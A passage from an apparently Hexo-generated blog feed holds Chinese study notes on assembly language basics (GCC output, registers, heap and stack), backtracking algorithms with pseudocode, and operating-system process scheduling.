<p>第一列是代表的类型，而第一行则是指的立即数，第二行则是指的寄存器，而剩下的都是存储器了。对于立即数和寄存器来讲，比较好理解，就是直接取值或者取寄存器的值。而对于存储器来讲，则有很多种情况，不过我们也可以看出，上面所有的情况，其实都是最后一种的特殊情况。Imm(Eb,Ei,s)是存储器取值的一般形式，比如当Imm为0时，则是倒数第二种取值方式。对于其它的形式，也可以使用同样的方式推算出来。</p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer14.html" target="_blank" rel="external">深入理解计算机系统（3.2）—数据格式、访问信息以及操作数指示符</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;汇编层次的对象&quot;&gt;&lt;a href=&quot;#汇编层次的对象&quot; class=&quot;headerlink&quot; title=&quot;汇编层次的对象&quot;&gt;&lt;/a&gt;汇编层次的对象&lt;/h3&gt;&lt;p&gt;在平时的开发过程中，CPU处理器的状态对开发者是隐藏的，我们看不到CPU当中各个对象的状态。但是在汇
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|走进汇编的世界</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E8%B5%B0%E8%BF%9B%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-走进汇编的世界/</id>
    <published>2018-05-05T20:03:58.000Z</published>
    <updated>2018-05-05T12:36:59.063Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什么，以及代码的运行步骤，就一定要学习汇编语言。</p>
<h3 id="What"><a href="#What" class="headerlink" title="What"></a>What</h3><p>我们知道，CPU 只负责计算，本身不具备智能。你输入一条指令（instruction），它就运行一次，然后停下来，等待下一条指令。</p>
<p>这些指令都是二进制的，称为操作码（opcode），比如加法指令就是00000011。编译器的作用，就是将高级语言写好的程序，翻译成一条条操作码。</p>
<p>对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。</p>
<p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令00000011写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>
<h3 id="初次体会汇编"><a href="#初次体会汇编" class="headerlink" title="初次体会汇编"></a>初次体会汇编</h3><p>在编译一段C语言程序的过程中，其实做了很多步骤，比如预编译处理、编译处理、汇编处理以及链接处理。我们要了解的汇编语言，就是在编译处理后的产物。因此我们可以在GCC的编译器当中加入一些参数来控制它只生成汇编语言，而不进行汇编处理和链接处理。</p>
<p>我们看下面这一段简单的C语言代码，假设为sum.c。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">int simple(int *xp,int y)&#123;</div><div class="line">    int t = *xp+y;</div><div class="line">    *xp=t;</div><div class="line">    return t;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们使用GCC编译器加-S参数来编译这段代码，最终我们可以得到一个sum.s的文件，我们使用cat来查看一下这个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.file    &quot;sum.c&quot;</div><div class="line">    .text</div><div class="line">.globl simple</div><div class="line">    .type    simple, @function</div><div class="line">simple:</div><div class="line">    pushl    %ebp</div><div class="line">    movl    %esp, %ebp</div><div class="line">    subl    $16, %esp</div><div class="line">    movl    8(%ebp), %eax//这一步是从主存取变量xp</div><div class="line">    movl    (%eax), %eax//取*xp的值</div><div class="line">    addl    12(%ebp), %eax//计算*xp+y，并存到%eax寄存器</div><div class="line">    movl    %eax, -4(%ebp)//将*xp+y赋给变量t</div><div class="line">    movl    8(%ebp), %eax//再取xp</div><div class="line">    movl    -4(%ebp), %edx//取t</div><div class="line">    movl    %edx, (%eax)//执行t-&gt;*xp</div><div class="line">    movl    -4(%ebp), %eax//将t放入%eax准备返回</div><div class="line">    leave</div><div class="line">    ret</div><div class="line">    .size    simple, .-simple</div><div class="line">    .ident    &quot;GCC: (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3&quot;</div><div class="line">    .section    .note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure></p>
<p>有些人可能会惊讶，为什么我们的源代码只有短短的三行，但是汇编的代码却有这么多行。这是很正常的，汇编指令能做的事情是很简单的，比如我们的加法运算，我们需要去内存中找到操作数，把内存中的操作数存在寄存器中，然后在进行加法运算。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>学习汇编语言，首先必须了解两个知识点：寄存器和内存模型。</p>
<p>先来看寄存器。CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。</p>
<p>但是，CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。</p>
<p>寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。</p>
<p><img src="/images/汇编-04.png" alt="寄存器"></p>
<h3 id="内存模型：Heap"><a href="#内存模型：Heap" class="headerlink" title="内存模型：Heap"></a>内存模型：Heap</h3><p>寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。</p>
<p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址</p>
<p><img src="/images/汇编-03.png" alt="内存模型"></p>
<p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用malloc命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址0x1000开始给他分配，一直分配到地址0x100A，如果再要求得到22个字节，那么就分配到0x1020。</p>
<p><img src="/images/汇编-01.png" alt="内存模型"></p>
<p>这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。</p>
<h3 id="内存模型：Stack"><a href="#内存模型：Stack" class="headerlink" title="内存模型：Stack"></a>内存模型：Stack</h3><p>除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。这里所说的栈与数据结构里的栈的思想是一样的，数据的操作都是<code>后进先出</code>。为什么这样呢，栈是为函数调用服务的，最后调用的函数进栈，哪当然是最后调用的函数先执行完，然后释放其占用的空间。<br><img src="/images/汇编-02.png" alt="Stack模型"></p>
<p><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="external">汇编语言入门教程</a><br><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="external">深入理解计算机系统（3.1）—走进汇编的世界</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|回溯法</title>
    <link href="http://yoursite.com/2018/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
    <id>http://yoursite.com/2018/05/04/计算机算法-回溯法/</id>
    <published>2018-05-03T23:08:09.000Z</published>
    <updated>2018-05-03T16:38:43.022Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>回溯算法(Backtracking)</code>实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。</p>
<p>回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。</p>
<p>许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。</p>
<p>用爬山来比喻回溯，好比从山脚下找一条爬上山顶的路,起初有好几条道可走,当选择一条道走到某处时,又有几条岔道可供选择,只能选择其中一条道往前走,若能这样子顺利爬上山顶则罢了,否则走到一条绝路上时,只好返回到最近的一个路口,重新选择另一条没走过的道往前走。如果该路口的所有路都走不通,只得从该路口继续回返。照此规则走下去,要么找到一条到达山顶的路,要么最终试过所有可能的道,无法到达山顶。</p>
<p><strong>回溯是一种穷举，但与brute force有一些区别，回溯带了两点脑子的，并不多，brute force一点也没带。</strong></p>
<ul>
<li>第一点脑子是回溯知道回头；相反如果是brute force,发现走不通立刻跳下山摔死，换第二条命从头换一条路走。</li>
<li>第二点脑子是回溯知道剪枝；如果有一条岔路上放了一坨屎，那这条路我们不走，就可以少走很多不必要走的路。</li>
</ul>
<p>回溯法搜索解空间树的时候，通常有两种策略来避免无效搜索，即 剪枝函数：</p>
<ul>
<li>约束函数：在扩展节点处剪去不满足约束的子树，</li>
<li>限界函数：剪去不能得到最优解的子树。</li>
</ul>
<p>还有一些爱混淆的概念：递归，回溯，DFS。</p>
<ul>
<li>回溯是一种找路方法，搜索的时候走不通就回头换路接着走，直到走通了或者发现此山根本不通。</li>
<li>DFS是一种开路策略，就是一条道先走到头，再往回走一步换一条路走到头，这也是回溯用到的策略。<strong>在树和图上回溯时人们叫它DFS。</strong></li>
<li>递归是一种行为，回溯和递归如出一辙，都是一言不合就回到来时的路，所以一般回溯用递归实现；当然也可以不用，用栈。</li>
</ul>
<h3 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h3><p>在包含问题的所有解的解空间树中，按照深度优先搜索的策略，从根结点出发深度探索解空间树。当探索到某一结点时，要先判断该结点是否包含问题的解，如果包含，就从该结点出发继续探索下去，如果该结点不包含问题的解，则逐层向其祖先结点回溯。（其实回溯法就是对隐式图的深度优先搜索算法）。</p>
<p>若用回溯法求问题的所有解时，要回溯到根，且根结点的所有可行的子树都要已被搜索遍才结束。</p>
<p>而若使用回溯法求任一个解时，只要搜索到问题的一个解就可以结束。</p>
<h3 id="用回溯法解题的一般步骤"><a href="#用回溯法解题的一般步骤" class="headerlink" title="用回溯法解题的一般步骤"></a>用回溯法解题的一般步骤</h3><ol>
<li>针对所给问题，确定问题的解空间：首先应明确定义问题的解空间，问题的解空间应至少包含问题的一个（最优）解。</li>
<li>确定结点的扩展搜索规则</li>
<li>以深度优先方式搜索解空间，并在搜索过程中用剪枝函数避免无效搜索。</li>
</ol>
<h3 id="算法框架"><a href="#算法框架" class="headerlink" title="算法框架"></a>算法框架</h3><p>问题框架</p>
<p>设问题的解是一个n维向量(a1,a2,………,an),约束条件是ai(i=1,2,3,…..,n)之间满足某种条件，记为f(ai)。</p>
<p>非递归回溯框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"> 1: int a[n],i;</div><div class="line"> 2: 初始化数组a[];</div><div class="line"> 3: i = 1;</div><div class="line"> 4: while (i&gt;0(有路可走)   and  (未达到目标))  // 还未回溯到头</div><div class="line"> 5: &#123;</div><div class="line"> 6:     if(i &gt; n)                                              // 搜索到叶结点</div><div class="line"> 7:     &#123;   </div><div class="line"> 8:           搜索到一个解，输出；</div><div class="line"> 9:     &#125;</div><div class="line">10:     else                                                   // 处理第i个元素</div><div class="line">11:     &#123; </div><div class="line">12:           a[i]第一个可能的值；</div><div class="line">13:           while(a[i]在不满足约束条件且在搜索空间内)</div><div class="line">14:           &#123;</div><div class="line">15:               a[i]下一个可能的值；</div><div class="line">16:           &#125;</div><div class="line">17:           if(a[i]在搜索空间内)</div><div class="line">18:          &#123;</div><div class="line">19:               标识占用的资源；</div><div class="line">20:               i = i+1;                              // 扩展下一个结点</div><div class="line">21:          &#125;</div><div class="line">22:          else </div><div class="line">23:         &#123;</div><div class="line">24:               清理所占的状态空间；            // 回溯</div><div class="line">25:               i = i –1; </div><div class="line">26:          &#125;</div><div class="line">27: &#125;</div></pre></td></tr></table></figure></p>
<p>递归的算法框架</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"> 1: int a[n];</div><div class="line"> 2: try(int i)</div><div class="line"> 3: &#123;</div><div class="line"> 4:     if(i&gt;n)</div><div class="line"> 5:        输出结果;</div><div class="line"> 6:      else</div><div class="line"> 7:     &#123;</div><div class="line"> 8:        for(j = 下界; j &lt;= 上界; j=j+1)  // 枚举i所有可能的路径</div><div class="line"> 9:        &#123;</div><div class="line">10:            if(fun(j))                 // 满足限界函数和约束条件</div><div class="line">11:              &#123;</div><div class="line">12:                 a[i] = j;</div><div class="line">13:               ...                         // 其他操作</div><div class="line">14:                 try(i+1);</div><div class="line">15:               回溯前的清理工作（如a[i]置空值等）;</div><div class="line">16:               &#125;</div><div class="line">17:          &#125;</div><div class="line">18:      &#125;</div><div class="line">19: &#125;</div></pre></td></tr></table></figure>
<p>DFS递归</p>
<p>回溯法的递归伪代码描述：</p>
<pre><code>void backtrack(int t)
{
    if(t &gt; n) output(x);
    else
        for (int i = f(n,t); i &lt;= g(n,t); ++i) {
            x[t] = h(i);
            if(constraint(t) &amp;&amp; bound(t)) backtrack(t+1);
        }
}
</code></pre><p>其中，</p>
<ul>
<li>参数 t 表示递归深度，即当前扩展节点在解空间树中的深度，</li>
<li>n 解空间树的高度，当 t&gt;n 时，表示已搜索到一个叶节点，</li>
<li>output(x) 打印可行解，</li>
<li>f(n,t) 和 g(n,t) 分别表示当前扩展节点处子树的起止编号，</li>
<li>h(i) 表示当前扩展节点处 x[t] 的第i个可选值，</li>
<li>constraint(t) 和 bound(t) 分别为约束函数和限界函数，用于剪枝。</li>
</ul>
<p>DFS迭代<br>回溯法的迭代伪代码描述：</p>
<pre><code>void iterative_backtrack()
{
    int t = 1;
    while (t &gt; 0) {
        if (f(n,t) &lt;= g(n,t)) {
            for (int i = f(n,t); i &lt;= g(n, t); ++i) {
                x[t] = h(i);
                if (constraint(t) &amp;&amp; bound(t)) {
                    if (solution(t)) output(x);
                    else ++t;
                }
            }
        } else {
            --t;
        }
    }
}
</code></pre><p>其中，</p>
<ul>
<li>solution(t) 判断当前扩展节点处是否已得到一个可行解。</li>
</ul>
<h3 id="常见回溯问题"><a href="#常见回溯问题" class="headerlink" title="常见回溯问题"></a>常见回溯问题</h3><h4 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a>排列问题</h4><p>常见问题描述：<code>求字符集合的所有排列。</code></p>
<p>思路：我们以三个字符abc为例来分析一下求字符串排列的过程。首先固定第一个字符a，求后面两个字符bc的排列。当两个字符bc的排列求好之后，我们把第一个字符a和后面的b交换，得到bac，接着我们固定第一个字符b，求后面两个字符ac的排列。现在是把c放到第一位置的时候了。记住前面我们已经把原先的第一个字符a和后面的b做了交换，为了保证这次c仍然是和原先处在第一位置的a交换，我们在拿c和第一个字符交换之前，先要把b和a交换回来。在交换b和a之后，再拿c和处在第一位置的a进行交换，得到cba。我们再次固定第一个字符c，求后面两个字符b、a的排列。</p>
<h4 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h4><p>常见问题描述：<code>求字符集合的m种组合。</code></p>
<p>思路：字符集合可以用一个长度为n的无重复字符的字符串表示。我们从头扫描字符串的第一个字符。针对第一个字符，有两种选择：一是把这个字符放到组合中去，接下来我们需要在剩下的n-1个字符中选取m-1个字符；二是不把这个字符放到组合中去，接下来我们需要在剩下的n-1个字符中选择m个字符。同样用递归的思路解决这个问题。</p>
<h4 id="子集和问题"><a href="#子集和问题" class="headerlink" title="子集和问题"></a>子集和问题</h4><p>常见子集和问题描述：<code>给定一个正整数集合A和正整数S，求A所有可能的子集A&#39;，其中A&#39;中所有元素之和等于S。</code></p>
<h4 id="8皇后问题"><a href="#8皇后问题" class="headerlink" title="8皇后问题"></a>8皇后问题</h4><p>8皇后的一个关键是确定约束函数，即如何判断某个位置是否可以放置一个皇后。</p>
<p>由于是在棋盘上，考虑利用坐标系解决：如果给这个8*8的矩阵上个坐标，横向(rows)为i = 0 to 7，纵向(columns)为j = 0 to 7。那么可以发现，在每一条斜线(/)方向上，每一个格子的横纵坐标之和(i + j)是一个固定值，从左上到右下的斜线，其值依次是0~14 (0+0; 0+1,1+0; 0+2,1+1,2+0; … ; 6+7,7+6; 7+7)；同样地，在每一条反斜线()方向上，每一个格子的横坐标与纵坐标的关系 (i + (7 - j)) 也是固定值，从右上到左下的斜线，其值依次是0~14。</p>
<p><a href="https://www.cnblogs.com/steven_oyj/archive/2010/05/22/1741376.html" target="_blank" rel="external">五大常用算法之四：回溯法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;&lt;code&gt;回溯算法(Backtracking)&lt;/code&gt;实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|关于cpu管理</title>
    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%85%B3%E4%BA%8Ecpu%E7%AE%A1%E7%90%86/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-关于cpu管理/</id>
    <published>2018-04-28T11:02:54.000Z</published>
    <updated>2018-04-28T04:20:50.057Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/edisonchou/p/5003694.html" target="_blank" rel="external">进程</a></p>
<h3 id="从单任务到多道任务"><a href="#从单任务到多道任务" class="headerlink" title="从单任务到多道任务"></a>从单任务到多道任务</h3><p>最开始的时候，计算机只能一个一个程序的运行，后来人们需求多了，需要在工作的同时还能听听歌、聊天…所以就发展到了多道任务的时代。同时，单一操作员单一控制终端，CPU使用率很低；多道任务也提高计算机CPU的利用率。</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>多道任务的思想虽然表面上看是多个程序同时运行，但在计算机的内部还是一次只能执行一个任务，造成同时运行的表象是因为cpu能做到快速切换。</p>
<p>我们都知道一个任务在运行的时候，是有它自己的状态的，比如说当前的指令是什么、下一条指令在哪里…专业点讲就是寄存器、程序计数器、状态字、栈指针、优先级、进程ID、创建时间、所耗CPU时间、当前持有的各种句柄等等。当CPU进行切换的时候，为了保证下次切换回来能恢复这些状态，就要有一个数据结构能保存这些数据，这就是<code>进程控制块（Process Control Block，PCB）</code>。</p>
<p>同时为了管理的方便，也引出了<code>进程</code>的概念，作为任务的另一说法。</p>
<blockquote>
<p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p>
</blockquote>
<p>所以，多道任务的理解就是：</p>
<p><strong>操作系统将需要运行的程序载入到内存中，并通过某种策略进行切换、分配cpu执行权限，给用户一种多进程同时运行的假象。</strong></p>
<h4 id="多视角度解读进程"><a href="#多视角度解读进程" class="headerlink" title="多视角度解读进程"></a>多视角度解读进程</h4><p><img src="/images/操作系统-关于cpu管理01.jpg" alt="多视角度解读进程"></p>
<ul>
<li><p>物理视角：从物理内存的分配来看，每个进程占用一片内存空间，从这点上看，进程其实就是内存的某片空间。由于在任意时刻，一个CPU只能执行一条指令，因此任意时刻在CPU上执行的进程只有一个，而到底执行哪条指令是由物理程序计数器指定。因此，<strong>在物理层面，所有进程共用一个程序计数器，只是CPU在不停地做进程切换</strong>。</p>
</li>
<li><p>逻辑视角：从逻辑层面来看，每个进程都可以执行，也可以暂时挂起让别的进程执行，之后又可以接着执行。所以，进程需要想办法保持状态才能在下次接着执行时从正确的地点开始。因此，每个进程都有自己的计数器，记录其下一条指令所在的位置。（从逻辑上来说，程序计数器可以有多个）</p>
</li>
<li><p>时序视角：从时间来看，每个进程都必须往前推进。在运行一定时间后，进程都应该完成了一定的工作量。换句话说，每次进程返回，它都处在上次返回点之后。哲学家有云：“一个人不能两次踏入同一条河流”</p>
</li>
</ul>
<h3 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h3><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p><img src="/images/操作系统-关于CPU管理02.gif" alt="进程状态"></p>
<h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>既然有多个进程在内存中等待执行，就需要有一种合理的策略来安排执行的顺序。首先，一般的程序任务分为三种：CPU计算密集型、IO密集型与平衡（计算与IO各半）型，对于不同类型的程序，调度需要达到的目的也有所不同。对于IO密集型，响应时间最重要；对于CPU密集型，则周转时间最重要；而对于平衡型，进行某种响应和周转之间的平衡就显得比较重要。</p>
<p>因此，进程调度的目标就是要达到极小化平均响应时间、极大化系统吞吐率、保持系统各个功能部件均处于繁忙状态和提供某种貌似公平的机制。</p>
<h4 id="基本调度算法"><a href="#基本调度算法" class="headerlink" title="基本调度算法"></a>基本调度算法</h4><h5 id="先来先服务算法"><a href="#先来先服务算法" class="headerlink" title="先来先服务算法"></a>先来先服务算法</h5><p><img src="/images/操作系统-关于CPU管理03.jpg" alt="FCFS"></p>
<p>先来先服务（FCFS）算法是一种最常见的算法，它是人的本性中的一种公平观念。其优点就是简单且实现容易，缺点则是短的工作有可能变得很慢，因为其前面有很长的工作在执行，这样就会造成用户的交互式体验也比较差。</p>
<p>例如排队办理业务时，你要办理的业务只需要几分钟就可以办好，但是你前面的一个人办理的事情很复杂需要1个小时，这时你需要在他后面等很久，于是你就想到：要是每个人轮流办理10分钟事务的话，那该多好！于是就出现了时间片轮转算法。</p>
<h5 id="时间片轮转算法"><a href="#时间片轮转算法" class="headerlink" title="时间片轮转算法"></a>时间片轮转算法</h5><p><img src="/images/操作系统-关于cpu管理04.jpg" alt="RR"></p>
<p>时间片轮转是对FCFS算法的一种改进，其主要目的是改善短程序的响应时间，实现方式就是周期性地进行进程切换。时间片轮转的重点在于时间片的选择，需要考虑多方因素：如果运行的进程多时，时间片就需要短一些；进程数量少时，时间片就可以适当长一些。因此，时间片的选择是一个综合的考虑，权衡各方利益，进行适当折中。</p>
<p>但是，时间片轮转的系统响应时间也不一定总是比FCFS的响应时间短。时间片轮转是一种大锅饭的做法，但是现实生活中却是走的“一部分人先富，先富带动后富”的路线。例如，如果有30个任务，其中一个任务只需要1秒时间执行，而其他29个任务需要30秒钟执行，如果因为某种原因，这个只要1秒钟的任务排在另外29个任务的后面轮转，则它需要等待29秒钟才能执行（假定时间片为1秒）。于是，这个任务的响应时间和交互体验就变得非常差。因此，短任务优先算法被提出。</p>
<h5 id="短任务优先算法"><a href="#短任务优先算法" class="headerlink" title="短任务优先算法"></a>短任务优先算法</h5><p>短任务优先算法的核心是所有的任务并不都一样，而是有优先级的区分。具体来说，就是短任务的优先级比长任务的高，而我们总是安排优先级高的任务先运行。</p>
<p>短任务优先算法又分为两种类型：一种是非抢占式，一种是抢占式。非抢占式当已经在CPU上运行的任务结束或阻塞时，从候选任务中选择执行时间最短的进程来执行。而抢占式则是每增加一个新的进程就需要对所有进程（包括正在CPU上运行的进程）进行检查，谁的时间短就运行谁。</p>
<p>由于短任务优先总是运行需要执行时间最短的程序，因此其系统平均响应时间在以上几种算法中是最优的，这也是短任务优先算法的优点。但短任务优先算法也有缺点：一是可能造成长任务无法得到CPU时间从而导致“肌饿”。二是如何知道每个进程还需要运转多久？于是为了解决第一个缺点，优先级调度算法被提出。而第二个缺点则可以采取一些启发式的方法来进行估算，目前很多的人工智能算法都可以做这个事。</p>
<h5 id="优先级调度算法"><a href="#优先级调度算法" class="headerlink" title="优先级调度算法"></a>优先级调度算法</h5><p>优先级调度算法给每个进程赋予一个优先级，每次需要进程切换时，找一个优先级最高的进程进行调度。这样如果赋予长进程一个高优先级，则该进程就不会再“饥饿”。事实上，短任务优先算法本身就是一种优先级调度，只不过它给予短进程更高的优先级而已。</p>
<p>该算法的优点在于可以赋予重要的进程以高优先级以确保重要任务能够得到CPU时间，其缺点则有二：一是低优先级的进程可能会“饥饿”，二是响应时间无法保证。第一个缺点可以通过动态地调节任务的优先级解决，例如一个进程如果等待时间过长，其优先级将因持续提升而超越其他进程的优先级，从而得到CPU时间。第二个缺点可以通过将一个进程优先级设置为最高来解决，但即使将优先级设置为最高，但如果每个人都将自己的进程优先级设置为最高，其响应时间还是无法保证。</p>
<h5 id="混合调度算法"><a href="#混合调度算法" class="headerlink" title="混合调度算法"></a>混合调度算法</h5><p>之前的算法都存在一定缺点，那么可否有一个算法混合他们的优点，摒弃它们的缺点，这就是所谓的混合调度算法。混合调度算法将所有进程分为不同的大类，每个大类为一个优先级。如果两个进程处于不同的大类，则处于高优先级大类的进程优先执行；如果处于同一个大类，则采用时间片轮转算法来执行。混合调度算法的示意图如下图所示：</p>
<p><img src="/images/操作系统-关于cpu管理05.jpg" alt="混合方法"></p>
<h4 id="进程调度的过程"><a href="#进程调度的过程" class="headerlink" title="进程调度的过程"></a>进程调度的过程</h4><p><img src="/images/操作系统-关于cpu管理06.jpg" alt="调度过程"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/edisonchou/p/5003694.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;进程&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;从单任务到多道任务&quot;&gt;&lt;a href=&quot;#从单任务到多道
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|一些基本概念</title>
